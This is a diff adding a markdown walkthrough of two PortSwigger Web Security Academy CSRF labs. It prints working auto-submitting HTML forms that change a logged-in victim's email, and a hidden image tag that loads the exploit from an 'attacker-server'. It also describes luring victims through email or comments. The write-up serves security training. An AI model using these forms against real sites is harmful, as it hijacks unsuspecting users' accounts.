@@ -223,3 +223,75 @@ Sucess! We got the flag.
 
 ___
 
+## CSRF
+
+### Lab: CSRF vulnerability with no defenses
+
+Go to "My account" and log in with the given credentials <br>
+
+Username: wiener<br>
+Password: peter
+
+Now we can see a section to change our email.
+
+![alt](lab14.png)
+
+If we enter an email while having Burp Proxy running, we can see the POST request to `/my-account/change-email HTTP/2` with body `email=newemail%40normal.com`. 
+
+So now we know that we need to construct an HTML that makes a POST request to `/my-account/change-email HTTP/2` but has as body our email.
+
+```html
+<html>
+    <body>
+        <form action="https://0a400076042ec1f4817e750d00c9009d.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="pwned@evil.com" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+```
+
+Now by using social engineering methods we can trick the user to run this HTML file. If the user loads this page and is already authorized to the website, then his email will be changed without him noticing.
+
+Note: The delivery mechanisms for cross-site request forgery attacks are essentially the same as for reflected XSS. Typically, the attacker will place the malicious HTML onto a website that they control, and then induce victims to visit that website. This might be done by feeding the user a link to the website, via an email or social media message. Or if the attack is placed into a popular website (for example, in a user comment), they might just wait for users to visit the website.
+For example we could send an email with an image tag, like `img src="http://attacker-server/csrf-exploit.html" width="0" height="0" border="0"` redirecting to the above html file hosted on our server.
+
+In this case we got a server ready by PortSwigger, so we just need to enter our payload and press the "Deliver exploit to victim".
+
+![alt](lab15.png)
+
+We have sucessfully solved the lab!
+
+___
+
+### Lab: CSRF where token validation depends on request method
+
+In this case when we change the email we see the POST request containing a CSRF-token to prevent us from forging a fake request.
+
+![alt](lab16.png)
+
+But if we change the request from POST to GET we can see its working. The defences for CSRF where applied only at POST requests, leaving the website vulnerable.
+
+![alt](lab17.png)
+
+So now we can construct the appropriate HTML file that will submit this request.
+
+```html
+<html>
+    <body>
+        <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+            <input type="hidden" name="email" value="anything%40web-security-academy.net">
+        </form>
+        <script>
+                document.forms[0].submit();
+        </script>
+    </body>
+</html>
+```
+
+Enter the payload to PortSwigger server and press "Deliver exploit to victim".
+
+___
+
